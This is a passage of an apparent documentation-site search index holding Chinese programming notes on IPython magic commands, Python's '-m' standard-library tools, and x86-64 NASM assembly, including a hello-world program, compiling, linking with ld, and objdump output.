\u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u7684\u65b9\u5f0f\uff0c\u8fbe\u5230\u6df1\u5ea6\u62f7\u8d1d\u7684\u76ee\u7684\u3002</p>"},{"location":"python/memory/#_6","title":"\u5185\u5b58\u5206\u914d","text":""},{"location":"python/memory/#_7","title":"\u5783\u573e\u56de\u6536","text":""},{"location":"python/tools/","title":"Python\u5e38\u7528\u5de5\u5177","text":""},{"location":"python/tools/#ipython","title":"IPython","text":"<p>\u901a\u8fc7<code>%quickref</code>\u53ef\u4ee5\u67e5\u770b\u529f\u80fd\u5bfc\u89c8\uff0c\u901a\u8fc7<code>%lsmagic</code>\u53ef\u4ee5\u5217\u51faipython\u4e2d\u652f\u6301\u7684\u9b54\u6cd5\u51fd\u6570: <pre><code>In [9]: %lsmagic\nOut[9]:\nAvailable line magics:\n%alias  %alias_magic  %autoawait  %autocall  %autoindent  %automagic  %bookmark  %cat  %cd  %clear\n%colors  %conda  %config  %cp  %cpaste  %debug  %dhist  %dirs  %doctest_mode  %ed  %edit  %env  %gui  %hist  %history  %killbgscripts  %ldir  %less  %lf  %lk  %ll  %load  %load_ext  %loadpy  %logoff\n%logon  %logstart  %logstate  %logstop  %ls  %lsmagic  %lx  %macro  %magic  %man  %matplotlib  %mkdir  %more  %mv  %notebook  %page  %paste  %pastebin  %pdb  %pdef  %pdoc  %pfile  %pinfo  %pinfo2  %pip  %popd  %pprint  %precision  %prun  %psearch  %psource  %pushd  %pwd  %pycat  %pylab  %quickref  %recall  %rehashx  %reload_ext  %rep  %rerun  %reset  %reset_selective  %rm  %rmdir  %run  %save  %sc  %set_env  %store  %sx  %system  %tb  %time  %timeit  %unalias  %unload_ext  %who  %who_ls  %whos\n%xdel  %xmode\n\nAvailable cell magics:\n%%!  %%HTML  %%SVG  %%bash  %%capture  %%debug  %%file  %%html  %%javascript  %%js  %%latex  %%markdown  %%perl  %%prun  %%pypy  %%python  %%python2  %%python3  %%ruby  %%script  %%sh  %%svg  %%sx  %%system  %%time  %%timeit  %%writefile\n</code></pre> \u63a5\u7740\u53ef\u901a\u8fc7\u7ed9\u67d0\u4e2a\u9b54\u6cd5\u51fd\u6570\u524d\u52a0\u95ee\u53f7\u7684\u65b9\u5f0f\u4f8b\u5982<code>?alias</code>\u6765\u67e5\u770b\u5b83\u7684\u5177\u4f53\u4f7f\u7528\u65b9\u6cd5\u3002\u5355\u4e2a<code>%</code>\u8868\u793a\u6267\u884c\u5f53\u524d\u884c\u7684\u5185\u5bb9\uff0c<code>%%</code>\u7528\u4e8e\u652f\u6301\u628a\u591a\u884c\u5185\u5bb9\u4f5c\u7528\u4e8e\u8be5\u9b54\u6cd5\u51fd\u6570\u3002</p>"},{"location":"python/tools/#_1","title":"\u81ea\u7701","text":"<p>\u5728ipython\u4e2d\uff0c\u901a\u5e38\u4f7f\u7528<code>?&lt;object&gt;</code>\u7684\u65b9\u5f0f\u67e5\u770b\u4e00\u4e2a\u5bf9\u8c61\u662f\u4ec0\u4e48\uff0c\u5f53\u8f93\u5165\u67d0\u4e2a\u5bf9\u8c61\u540e\u53ef\u4ee5\u6309\u4e0btab\u952e\u67e5\u770b\u5176\u6210\u5458\uff0c\u901a\u8fc7<code>%pdoc</code>\u53ef\u67e5\u770b\u5176docstring\uff0c<code>%psource</code>\u53ef\u67e5\u770b\u67d0\u4e2a\u76ee\u6807\u5bf9\u8c61\u7684\u6e90\u7801(\u5982\u679c\u5bf9\u8c61\u662fmodule\uff0c\u9700\u8981\u7528<code>%pfile</code>)\uff0c<code>%who</code>\u548c<code>%whos</code>\u67e5\u770b\u5f53\u524d\u73af\u5883\u4e2d\u7684\u5bf9\u8c61\u5217\u8868\u3002 <pre><code>In [1]: import demo\n\nIn [2]: ?demo\nType:        module\nString form: &lt;module 'demo' from '/home/hejl/demo.py'&gt;\nFile:        ~/demo.py\nDocstring:   test for doc module\n\nIn [3]: %pdoc demo\nClass docstring:\n    test for doc module\n\nIn [4]: %psource demo.b\ndef b():\n    print(\"helloworld!\")\n\nIn [5]: %pfile demo\n\"\"\"\ntest for doc module\n\"\"\"\n\na = 1\n\ndef b():\n    print(\"helloworld!\")\n\nIn [6]: c = 2\n\nIn [7]: %who\nc        demo\n\nIn [8]: %whos\nVariable   Type      Data/Info\n------------------------------\nc          int       2\ndemo       module    &lt;module 'demo' from '/home/hejl/demo.py'&gt;\n</code></pre></p>"},{"location":"python/tools/#_2","title":"\u641c\u7d22","text":"<p>ipython\u652f\u6301\u641c\u7d22\u53ef\u7528\u7684\u51fd\u6570\uff0c\u4ee5\u53ca\u5f53\u524d\u73af\u5883\u4e0b\u7684\u5bf9\u8c61: <pre><code>In [1]: import sys\n\nIn [2]: ?sys.get*\nsys.get_asyncgen_hooks\nsys.get_coroutine_wrapper\nsys.getallocatedblocks\nsys.getcheckinterval\nsys.getdefaultencoding\nsys.getdlopenflags\nsys.getfilesystemencodeerrors\nsys.getfilesystemencoding\nsys.getprofile\nsys.getrecursionlimit\nsys.getrefcount\nsys.getsizeof\nsys.getswitchinterval\nsys.gettrace\n\nIn [3]: ?sys.get*of\nsys.getsizeof\n\nIn [4]: ?s*\nset\nsetattr\nslice\nsorted\nstaticmethod\nstr\nsum\nsuper\nsys\n</code></pre></p>"},{"location":"python/tools/#_3","title":"\u5386\u53f2","text":"<p>\u901a\u8fc7<code>%history -n</code>\u53ef\u7528\u67e5\u770b\u5728ipython\u4e2d\u5168\u90e8\u8f93\u5165\u7684\u5386\u53f2\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7<code>_i</code>\u67e5\u770b\u4e0a\u4e00\u4e2a\uff0c<code>_ii</code>\u548c<code>_iii</code>\u67e5\u770b\u4e0a\u4e24\u4e2a\u548c\u4e09\u4e2a\uff0c<code>_i&lt;n&gt;</code>\u67e5\u770b\u4e0an\u4e2a: <pre><code>In [6]: _i2\nOut[6]: '?sys.get*'\n\nIn [7]: %history -n\n   1: import sys\n   2: ?sys.get*\n   3: ?sys.get*of\n   4: ?s *\n   5: ?s*\n   6: _i2\n   7: %history -n\n\nIn [8]: _i, _ii, _iii\nOut[8]: ('%history -n', '_i2', '?s*')\n</code></pre></p> <p>\u8fd8\u53ef\u4ee5\u628a\u5386\u53f2\u547d\u4ee4\u4e2d\u7684\u67d0\u4e9b\u884c\u7f16\u5199\u4e3a\u4e00\u4e2a\u5b8f\uff0c\u901a\u8fc7\u5b8f\u53ef\u4ee5\u91cd\u590d\u8c03\u7528\uff0c\u4e0b\u4f8b\u4e2d\u628a\u7b2c9\u81f3\u7b2c10\u884c\u3001\u5916\u52a0\u7b2c12\u884c\u7f16\u5199\u5165\u4e86\u4e00\u4e2a\u5b8f: <pre><code>In [9]: x,y=1,2\n\nIn [10]: print(x+y)\n3\n\nIn [11]: y=10\n\nIn [12]: print(x+y)\n11\n\nIn [13]: %macro tes 9-10 12\nMacro `tes` created. To execute, type its name (without quotes).\n=== Macro contents: ===\nx,y=1,2\nprint(x+y)\nprint(x+y)\n\nIn [14]: tes\n3\n3\n</code></pre></p> <p>\u8fd8\u53ef\u4ee5\u4f7f\u7528<code>%save</code>\u628a\u5b8f\u6216\u8005\u67d0\u4e9b\u884c\u4fdd\u5b58\u5728\u4e00\u4e2a\u6587\u4ef6\u4e2d: <pre><code>In [15]: %save test.py tes\nThe following commands were written to file `test.py`:\nx,y=1,2\nprint(x+y)\nprint(x+y)\n\nIn [16]: %save test.py 9-10\nFile `test.py` exists. Overwrite (y/[N])?  y\nThe following commands were written to file `test.py`:\nx,y=1,2\nprint(x+y)\n</code></pre></p>"},{"location":"python/tools/#_4","title":"\u547d\u4ee4","text":"<p>\u53ef\u4ee5\u901a\u8fc7<code>!</code>\u6267\u884cshell\u4e2d\u7684\u547d\u4ee4\uff0c\u547d\u4ee4\u6267\u884c\u7ed3\u679c\u53ef\u4ee5\u76f4\u63a5\u8d4b\u503c\u7ed9python\u53d8\u91cf\uff0c\u4e5f\u53ef\u4ee5\u5c06python\u53d8\u91cf\u4f20\u5165shell: <pre><code>In [26]: !ls\n6.824        basic                 dump.rdb         get-pip.py         my_git       test.py\nMIT-6.824    cliu8siteprivate.key  fastapi-vue-cms  helloworld.key     practise-go\n__pycache__  demo.py               flask-shop       hjlarry.github.io  practise-py\n\nIn [27]: a = !ls\n\nIn [28]: a\nOut[28]:\n['6.824',\n 'MIT-6.824',\n '__pycache__',\n ...]\n\nIn [31]: x=100\n\nIn [32]: !echo \"python.x={x+20}\"\npython.x=120\n</code></pre></p>"},{"location":"python/tools/#_5","title":"\u5185\u7f6e\u6a21\u5757","text":""},{"location":"python/tools/#_6","title":"\u67e5\u770b\u5305\u8def\u5f84","text":"<pre><code>~/projects \u00bb python3 -m site                                                                         \nsys.path = [\n    '/Users/hejl/projects',\n    '/usr/local/Cellar/python@3.8/3.8.4/Frameworks/Python.framework/Versions/3.8/lib/python38.zip',\n    '/usr/local/Cellar/python@3.8/3.8.4/Frameworks/Python.framework/Versions/3.8/lib/python3.8',\n    '/usr/local/Cellar/python@3.8/3.8.4/Frameworks/Python.framework/Versions/3.8/lib/python3.8/lib-dynload',\n    '/usr/local/lib/python3.8/site-packages',\n    '/usr/local/Cellar/protobuf/3.12.3/libexec/lib/python3.8/site-packages',\n    '/usr/local/Cellar/python@3.8/3.8.4/Frameworks/Python.framework/Versions/3.8/lib/python3.8/site-packages',\n]\nUSER_BASE: '/Users/hejl/Library/Python/3.8' (doesn't exist)\nUSER_SITE: '/Users/hejl/Library/Python/3.8/lib/python/site-packages' (doesn't exist)\nENABLE_USER_SITE: True\n</code></pre>"},{"location":"python/tools/#json","title":"\u683c\u5f0f\u5316json","text":"<pre><code>~/projects \u00bb cat test.json                  \n{\"_id\":\"5f12d319624e57e27d1291fe\",\"index\":0,\"name\":\"MasseySaunders\",\"gender\":\"male\",\"company\":\"TALAE\",\"email\":\"masseysaunders@talae.com\",\"phone\":\"+1(853)508-3237\",\"address\":\"246IndianaPlace,Glenbrook,Iowa,3896\",\"registered\":\"2017-02-06T06:42:20-08:00\",\"latitude\":-10.269827,\"longitude\":-103.12419,\"friends\":[{\"id\":0,\"name\":\"DorotheaShields\"},{\"id\":1,\"name\":\"AnnaRosales\"},{\"id\":2,\"name\":\"GravesBryant\"}],\"greeting\":\"Hello,MasseySaunders!Youhave8unreadmessages.\",\"favoriteFruit\":\"apple\"}\n------------------------------------------------------------\n~/projects \u00bb python3 -m json.tool test.json                             \n{\n    \"_id\": \"5f12d319624e57e27d1291fe\",\n    \"index\": 0,\n    \"name\": \"MasseySaunders\",\n    \"gender\": \"male\",\n    \"company\": \"TALAE\",\n    \"email\": \"masseysaunders@talae.com\",\n    \"phone\": \"+1(853)508-3237\",\n    \"address\": \"246IndianaPlace,Glenbrook,Iowa,3896\",\n    \"registered\": \"2017-02-06T06:42:20-08:00\",\n    \"latitude\": -10.269827,\n    \"longitude\": -103.12419,\n    \"friends\": [\n        {\n            \"id\": 0,\n            \"name\": \"DorotheaShields\"\n        },\n        {\n            \"id\": 1,\n            \"name\": \"AnnaRosales\"\n        },\n        {\n            \"id\": 2,\n            \"name\": \"GravesBryant\"\n        }\n    ],\n    \"greeting\": \"Hello,MasseySaunders!Youhave8unreadmessages.\",\n    \"favoriteFruit\": \"apple\"\n}\n</code></pre>"},{"location":"python/tools/#http","title":"\u642d\u5efahttp\u670d\u52a1\u5668","text":"<pre><code>~/projects \u00bb python3 -m http.server 8002                                                        \nServing HTTP on :: port 8002 (http://[::]:8002/) ...\n</code></pre>"},{"location":"python/tools/#py","title":"\u6253\u5f00py\u6587\u6863","text":"<pre><code>~/projects \u00bb python3 -m pydoc -p 8002                                                            \nServer ready at http://localhost:8002/\nServer commands: [b]rowser, [q]uit\nserver&gt;\n</code></pre>"},{"location":"python/tools/#pdb","title":"\u76f4\u63a5\u8fdb\u5165pdb","text":"<pre><code>~/projects \u00bb python3 -m pdb test.py                                                            \n&gt; /Users/hejl/projects/test.py(1)&lt;module&gt;()\n-&gt; print(\"hello\")\n(Pdb) \n</code></pre>"},{"location":"python/tools/#_7","title":"\u5b89\u88c5\u5305","text":"<pre><code>$ python3.8 -m pip install requests\n</code></pre>"},{"location":"python/tools/#_8","title":"\u865a\u62df\u73af\u5883","text":"<pre><code>~/projects \u00bb python3 -m venv .venv \n</code></pre>"},{"location":"sicp/asm/","title":"\u6c47\u7f16\u8bed\u8a00","text":""},{"location":"sicp/asm/#_2","title":"\u57fa\u7840\u77e5\u8bc6","text":"<p>\u7f16\u7a0b\u8bed\u8a00\u662f\u7ed9\u4eba\u770b\u7684\uff0cCPU\u770b\u4e0d\u61c2\u6c47\u7f16\u8bed\u8a00\uff0cCPU\u80fd\u770b\u61c2\u7684\u53ea\u6709\u4e8c\u8fdb\u5236\u6307\u4ee4\u3002\u65e9\u671f\u901a\u8fc7\u7eb8\u5e26\u6253\u5b54\u7684\u65b9\u5f0f\u8f93\u5165\u6307\u4ee4\uff0c\u540e\u6765\u9010\u6e10\u53d1\u5c55\u51fa\u4e86\u52a9\u8bb0\u7b26\uff0c\u4e5f\u5c31\u662f\u4f8b\u5982\u8df3\u8f6c\u3001\u5faa\u73af\u4e4b\u7c7b\u7684\u6307\u4ee4\uff0c\u518d\u7531\u7f16\u8bd1\u5668(\u6c47\u7f16\u5668)\u628a\u8fd9\u4e9b\u52a9\u8bb0\u7b26\u8fd8\u539f\u4e3a\u4e8c\u8fdb\u5236\u7684\u6307\u4ee4\u3002\u6240\u4ee5\u6c47\u7f16\u8bed\u8a00\u53ef\u4ee5\u7406\u89e3\u4e3a\u673a\u5668\u8bed\u8a00\u7684\u4e00\u79cd\u65b9\u8a00\uff0c\u65b9\u4fbf\u4eba\u7c7b\u53bb\u8bb0\u5fc6\u5b83\uff0c\u6c47\u7f16\u8bed\u8a00\u548c\u673a\u5668\u8bed\u8a00\u5c31\u5b58\u5728\u7740\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u7684\u4e00\u4e00\u5bf9\u5e94\u7684\u5173\u7cfb\u3002</p> <p>\u6c47\u7f16\u662f\u9762\u5411\u673a\u5668\u7f16\u7a0b\u7684\u8bed\u8a00\uff0c\u4e0d\u540c\u7684\u786c\u4ef6\u7684\u6307\u4ee4\u53ef\u80fd\u662f\u4e0d\u540c\u7684\uff0c\u5b83\u80fd\u76f4\u63a5\u8bbf\u95ee\u786c\u4ef6\u7684\u5b58\u50a8\u548c\u7aef\u53e3\uff0c\u6700\u5927\u7a0b\u5ea6\u53d1\u6325\u51fa\u786c\u4ef6\u7684\u80fd\u529b\u3002\u5b83\u8fd8\u6709\u4e00\u4e9b\u5176\u4ed6\u7684\u4f7f\u7528\u573a\u666f\uff0c\u4f8b\u5982\u4f18\u5316\u4ee3\u7801\u8ffd\u6c42\u6781\u81f4\u6548\u7387\u3001\u76f4\u63a5\u8c03\u8bd5\u548c\u4fee\u6539\u6ca1\u6709\u6e90\u7801\u7684\u7a0b\u5e8f\u3001\u8bca\u65ad\u6076\u610f\u8f6f\u4ef6\u3001\u8fdb\u884c\u9006\u5411\u5206\u6790\u7b49\u3002\u6c47\u7f16\u7684\u7f3a\u70b9\u4e5f\u663e\u800c\u6613\u89c1\uff0c\u5bf9\u591a\u6570\u4eba\u800c\u8a00\uff0c\u6c47\u7f16\u4ee3\u7801\u96be\u61c2\uff0c\u4e0d\u6613\u7ef4\u62a4\uff0c\u96be\u4e8e\u8c03\u8bd5\uff0c\u4e0d\u6613\u79fb\u690d\uff0c\u5f00\u53d1\u6548\u7387\u4f4e\u3002</p> <p>\u6c47\u7f16\u8bed\u8a00\u7684\u98ce\u683c\u5206\u4e3a\u4e24\u79cd\uff0cIntel\u7684\u548cAT&amp;T\u7684\uff0c\u76f8\u5f53\u4e8e\u7528\u4e0d\u540c\u7684\u65b9\u8a00\u63cf\u8ff0\u673a\u5668\u8bed\u8a00\u3002AT&amp;T\u98ce\u683c\u4e3b\u8981\u662fGNU\u4f7f\u7528\u7684\uff0c\u6c47\u7f16\u5668\u4e3b\u8981\u662fGAS/as;Intel\u98ce\u683c\u4e3b\u8981\u662fwindows\u4f7f\u7528\u7684\uff0c\u6c47\u7f16\u5668\u6709MASM\u3001NASM\u3001TASM\u3001FASM\u3002\u5b83\u4eec\u7684\u4e3b\u8981\u533a\u522b\u5728\u4e8eAT&amp;T\u4f1a\u5728\u5bc4\u5b58\u5668\u540d\u5b57\u524d\u52a0%\uff0c\u5728\u7acb\u5373\u64cd\u4f5c\u6570\u524d\u52a0$\u524d\u7f00\uff0c\u4e14\u6e90\u548c\u76ee\u6807\u64cd\u4f5c\u6570\u7684\u987a\u5e8f\u548cIntel\u76f8\u53cd\u3002\u8be6\u7ec6\u533a\u522b\u53ef\u53c2\u8003wiki\uff0c\u4ee5\u53ca\u8fd9\u7bc7\u6587\u7ae0\u3002</p> <p>\u672c\u6587\u4f7f\u7528NASM\u6c47\u7f16\u5668\uff0c\u5b83\u91c7\u7528Intel\u8bed\u6cd5\u98ce\u683c\uff0c\u652f\u6301\u5f88\u591a\u79cd\u683c\u5f0f\uff0c\u5305\u62ecELF\u3001COFF\u3001Mach-O\u3001Win32\u3001Win64\u7b49\uff0c\u53ef\u4f7f\u7528<code>nasm -hf</code>\u67e5\u770b\u5176\u6240\u6709\u652f\u6301\u7684\u683c\u5f0f\u3002</p>"},{"location":"sicp/asm/#_3","title":"\u5904\u7406\u8fc7\u7a0b","text":"<p>Hello world\u793a\u4f8b\u7a0b\u5e8f: <pre><code>global _start \n\nsection .data\n    hello : db `hello, world!\\n`\nsection .text \n    _start:\n        mov rax, 1      ; system call number should be store in rax\n        mov rdi, 1      ; argument #1 in rdi: where to write (descriptor)?\n        mov rsi, hello  ; argument #2 in rsi: where does the string start?\n        mov rdx, 14     ; argument #3 in rdx: how many bytes to write?\n        syscall         ; this instruction invokes a system call\n\n        mov rax, 60     ; 'exit' syscall number\n        xor rdi, rdi\n        syscall\n</code></pre></p>"},{"location":"sicp/asm/#_4","title":"\u7f16\u8bd1","text":"<p>\u628a\u6bcf\u4e00\u4e2a\u6e90\u7801\u6587\u4ef6(\u53ef\u80fd\u662f<code>.c</code>,<code>.s</code>,<code>.go</code>\u7b49\u683c\u5f0f)\u7ffb\u8bd1\u4e3a\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6(\u53ef\u80fd\u662f<code>.o</code>)\uff0c\u5b83\u548c\u53ef\u6267\u884c\u6587\u4ef6\u5f88\u50cf\uff0c\u4e5f\u662f\u7531\u4e00\u4e2a\u4e2a\u8868\u6784\u6210\uff0c\u4f46\u95ee\u9898\u662fA\u6587\u4ef6\u82e5\u8c03\u7528B\u6587\u4ef6\u7684\u51fd\u6570\uff0cA\u662f\u4e0d\u77e5\u9053B\u5728\u54ea\u7684\uff0c\u7f16\u8bd1\u5668\u5c31\u4f1a\u628a\u8fd9\u4e2aB\u7684\u4f4d\u7f6e\u7a7a\u4e0b\u6765\uff0c\u5e76\u628a\u8fd9\u4e2a\u4fe1\u606f\u5199\u5728\u8868\u4e2d\u67d0\u4e2a\u4f4d\u7f6e\u7b49\u5f85\u4e4b\u540e\u8fdb\u884c\u91cd\u5b9a\u4f4d\u3002</p> <p>\u6211\u4eec\u4f7f\u7528\u7f16\u8bd1\u8bed\u53e5<code>nasm -g -F dwarf -f elf64 -o hello.o hello.s</code>\u6765\u7f16\u8bd1\u4e4b\u524d\u7684helloworld\u7a0b\u5e8f\u3002\u5176\u4e2d<code>-o hello.o</code>\u8868\u793a\u8f93\u51fa\u7684\u76ee\u6807\u6587\u4ef6\u540d\u79f0\u4e3ahello.o\uff0c<code>-f elf64</code>\u8868\u793a\u76ee\u6807\u6587\u4ef6\u7684\u683c\u5f0f\u91c7\u53d6elf64\u7684\uff0c<code>-g</code>\u8868\u793a\u8981\u751f\u6210\u8c03\u8bd5\u4fe1\u606f\uff0c<code>-F dwarf</code>\u7528\u6765\u6307\u5b9a\u751f\u6210\u7684\u8c03\u8bd5\u4fe1\u606f\u7684\u683c\u5f0f\u3002\u6b64\u5916\u53ef\u4ee5\u901a\u8fc7<code>-O</code>\u6307\u5b9a\u4e0d\u540c\u7684\u4f18\u5316\u7ea7\u522b\uff0c\u53ef\u80fd\u6709O0\u3001O1\u3001O2\u7b49\uff0c<code>-E</code>\u8868\u793a\u53ea\u505a\u9884\u5904\u7406\u3002</p> <p>\u65e5\u5e38\u8bf4\u7f16\u8bd1\u7684\u65f6\u5019\u5f80\u5f80\u6307\u7684\u662f\u7f16\u8bd1\u548c\u94fe\u63a5\u4e24\u4e2a\u8fc7\u7a0b\u3002</p>"},{"location":"sicp/asm/#_5","title":"\u94fe\u63a5","text":"<p>\u94fe\u63a5\u5c31\u662f\u628a\u7f16\u8bd1\u540e\u7684\u76ee\u6807\u6587\u4ef6\u5408\u5e76\u5728\u4e00\u8d77\uff0c\u901a\u8fc7\u8d77\u59cb\u5730\u5740\u5c31\u80fd\u8ba1\u7b97\u51fa\u5404\u4e2a\u76ee\u6807\u6587\u4ef6\u7684\u504f\u79fb\u91cf\uff0c\u4e5f\u5c31\u77e5\u9053\u4e86\u7f16\u8bd1\u65f6\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u90a3\u4e9b\u51fd\u6570\u7684\u5730\u5740\uff0c\u518d\u628a\u5b83\u586b\u8fdb\u53bb\u3002</p> <p>\u6211\u4eec\u4f7f\u7528GNU\u901a\u7528\u7684\u94fe\u63a5\u5668\u6765\u94fe\u63a5\uff0c\u4e5f\u53ef\u4ee5\u5bf9\u6bd4\u51fa\u76ee\u6807\u6587\u4ef6\u548c\u94fe\u63a5\u540e\u7684\u53ef\u6267\u884c\u6587\u4ef6\u7684\u533a\u522b: <pre><code>[ubuntu] ~/.mac/assem $ nasm -g -f elf64 -o hello.o hello.s\n[ubuntu] ~/.mac/assem $ ld -o hello hello.o\n\n[ubuntu] ~/.mac/assem $ file hello.o\nhello.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped\n[ubuntu] ~/.mac/assem $ file hello\nhello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped\n\n[ubuntu] ~/.mac/assem $ objdump -d -M intel hello.o\nhello.o:     file format elf64-x86-64\nDisassembly of section .text:\n0000000000000000 &lt;_start&gt;:\n   0:   b8 01 00 00 00          mov    eax,0x1\n   5:   bf 01 00 00 00          mov    edi,0x1\n   a:   48 be 00 00 00 00 00    movabs rsi,0x0\n  11:   00 00 00\n  14:   ba 0e 00 00 00          mov    edx,0xe\n  19:   0f 05                   syscall\n  1b:   b8 3c 00 00 00          mov    eax,0x3c\n  20:   48 31 ff                xor    rdi,rdi\n  23:   0f 05                   syscall\n[ubuntu] ~/.mac/assem $ objdump -d -M intel hello\nhello:     file format elf64-x86-64\nDisassembly of section .text:\n00000000004000b0 &lt;_start&gt;:\n  4000b0:   b8 01 00 00 00          mov    eax,0x1\n  4000b5:   bf 01 00 00 00          mov    edi,0x1\n  4000ba:   48 be d8 00 60 00 00    movabs rsi,0x6000d8\n  4000c1:   00 00 00\n  4000c4:   ba 0e 00 00 00          mov    edx,0xe\n  4000c9:   0f 05                   syscall\n  4000cb:   b8 3c 00 00 00          mov    eax,0x3c\n  4000d0:   48 31 ff                xor    rdi,rdi\n  4000d3:   0f 05                   syscall\n</code></pre></p> <p>\u901a\u8fc7\u53cd\u7f16\u8bd1\u53d1\u73b0\u76ee\u6807\u6587\u4ef6\u7684\u8d77\u59cb\u5730\u5740_start\u662f0\uff0c\u6240\u4ee5\u6b64\u65f6\u7684<code>movabs rsi,0x0</code>\u4e5f\u8868\u793a\u4e0d\u77e5\u9053hello\u7684\u5730\u5740\uff0c\u800c\u94fe\u63a5\u4e4b\u540e\u8fd9\u4e9b\u5730\u5740\u90fd\u6709\u4e86\u3002\u94fe\u63a5\u5668\u4e5f\u652f\u6301\u4e00\u4e9b\u5e38\u89c1\u7684\u53c2\u6570\uff0c\u4f8b\u5982<code>-e</code>\u53bb\u6307\u5b9a\u4e00\u4e2a\u975e\u9ed8\u8ba4\u7684\u5165\u53e3\u6807\u7b7e\uff0c<code>-s</code>\u53bb\u79fb\u9664\u6240\u6709\u7684\u7b26\u53f7\u4fe1\u606f\uff0c<code>-S</code>\u4ec5\u79fb\u9664\u8c03\u8bd5\u4fe1\u606f\u3002</p> <p>\u6211\u4eec\u518d\u6765\u770b\u770bGo\u7684\u7f16\u8bd1\u548c\u94fe\u63a5\u8fc7\u7a0b: <pre><code>[ubuntu] ~/.mac/gocode $ go build -x main.go\nWORK=/tmp/go-build182029561\nmkdir -p $WORK/b001/\ncat &gt;$WORK/b001/importcfg &lt;&lt; 'EOF' # internal\n# import config\npackagefile runtime=/usr/local/go/pkg/linux_amd64/runtime.a\nEOF\ncd /root/.mac/gocode\n/usr/local/go/pkg/tool/linux_amd64/compile -o $WORK/b001/_pkg_.a -trimpath \"$WORK/b001=&gt;\" -p main -complete -buildid dR1ZsbI6brd59SPrnOhX/dR1ZsbI6brd59SPrnOhX -goversion go1.13 -D _/root/.mac/gocode -importcfg $WORK/b001/importcfg -pack -c=2 ./main.go\n/usr/local/go/pkg/tool/linux_amd64/buildid -w $WORK/b001/_pkg_.a # internal\ncp $WORK/b001/_pkg_.a /root/.cache/go-build/dd/ddfadd34424d01a7a08b5c1cad7d09610caf9d21c8372338aed2d3331c8802cd-d # internal\ncat &gt;$WORK/b001/importcfg.link &lt;&lt; 'EOF' # internal\npackagefile command-line-arguments=$WORK/b001/_pkg_.a\npackagefile runtime=/usr/local/go/pkg/linux_amd64/runtime.a\npackagefile internal/bytealg=/usr/local/go/pkg/linux_amd64/internal/bytealg.a\npackagefile internal/cpu=/usr/local/go/pkg/linux_amd64/internal/cpu.a\npackagefile runtime/internal/atomic=/usr/local/go/pkg/linux_amd64/runtime/internal/atomic.a\npackagefile runtime/internal/math=/usr/local/go/pkg/linux_amd64/runtime/internal/math.a\npackagefile runtime/internal/sys=/usr/local/go/pkg/linux_amd64/runtime/internal/sys.a\nEOF\nmkdir -p $WORK/b001/exe/\ncd .\n/usr/local/go/pkg/tool/linux_amd64/link -o $WORK/b001/exe/a.out -importcfg $WORK/b001/importcfg.link -buildmode=exe -buildid=Nk0qisr5lCLaTQS25eF-/dR1ZsbI6brd59SPrnOhX/NtfWFt1P1m_70TCcgRz3/Nk0qisr5lCLaTQS25eF- -extld=gcc $WORK/b001/_pkg_.a\n/usr/local/go/pkg/tool/linux_amd64/buildid -w $WORK/b001/exe/a.out # internal\ncp $WORK/b001/exe/a.out main\nrm -r $WORK/b001/\n</code></pre></p> <p>\u5b83\u4e5f\u6709\u81ea\u5df1\u7684\u7f16\u8bd1\u5668\u548c\u94fe\u63a5\u5668\uff0c\u53ea\u662f\u5b83\u7684\u76ee\u6807\u6587\u4ef6\u901a\u8fc7<code>-pack</code>\u53c2\u6570\u8fdb\u884c\u4e86\u6253\u5305\uff0c\u6253\u5305\u4e3a\u4e00\u4e2a\u4e2a<code>.a</code>\u683c\u5f0f\u518d\u8fdb\u884c\u94fe\u63a5\u3002</p>"},{"location":"sicp/asm/#_6","title":"\u6e90\u7801\u7ed3\u6784","text":"<p>\u6c47\u7f16\u8bed\u8a00\u90fd\u662f\u5bf9\u5185\u5b58\u7684\u5904\u7406\uff0c\u5176\u672c\u8eab\u6ca1\u6709\u51fd\u6570\u7684\u6982\u5ff5\uff0c\u4e3a\u4e86\u4fbf\u4e8e\u7ef4\u62a4\u548c\u5199\u8df3\u8f6c\u4e4b\u7c7b\u7684\u8bed\u53e5\uff0c\u5c31\u6709\u4e86\u6807\u7b7e\u4ee3\u8868\u76f8\u5e94\u7684\u5185\u5b58\u5730\u5740\uff0c\u653e\u5728\u4e0d\u540c\u7684section\u4e2d\u3002</p>"},{"location":"sicp/asm/#_7","title":"\u6807\u7b7e","text":"<pre><code>global _start \n\nsection .text \n    main:\n        mov rax, 60\n        xor rdi, rdi\n        syscall\n    _start:\n        jmp main \n</code></pre> <p>\u4e0a\u8ff0\u6e90\u7801\u4e2d<code>main</code>\u4e0e<code>_start</code>\u79f0\u4e3a\u6807\u7b7e\uff0c\u53ef\u4ee5\u4f7f\u7528<code>jmp</code>\u8df3\u8f6c\u81f3\u67d0\u4e2a\u6807\u7b7e\uff0c\u6216\u8005<code>call</code>\u8c03\u7528\u67d0\u4e2a\u6807\u7b7e\u7684\u5185\u5bb9\u3002</p> <p>\u6807\u7b7e\u4f1a\u88ab\u7f16\u8bd1\u5668\u7ffb\u8bd1\u4e3a\u5185\u5b58\u5730\u5740\uff0c\u6211\u4eec\u901a\u8fc7\u7b26\u53f7\u8868\u4e5f\u80fd\u770b\u5230\u5b83\u3002\u4f7f\u7528global\u53ef\u4ee5\u628a\u8fd9\u4e2a\u6807\u7b7e\u58f0\u660e\u4e3a\u5168\u5c40\u7684\u6807\u7b7e\u3002</p>"},{"location":"sicp/asm/#_8","title":"\u672c\u5730\u6807\u7b7e","text":"<pre><code>section .text \n    main:\n        jmp .hello\n    .hello:\n        mov rax, 60\n        xor rdi, rdi\n        syscall\n</code></pre> 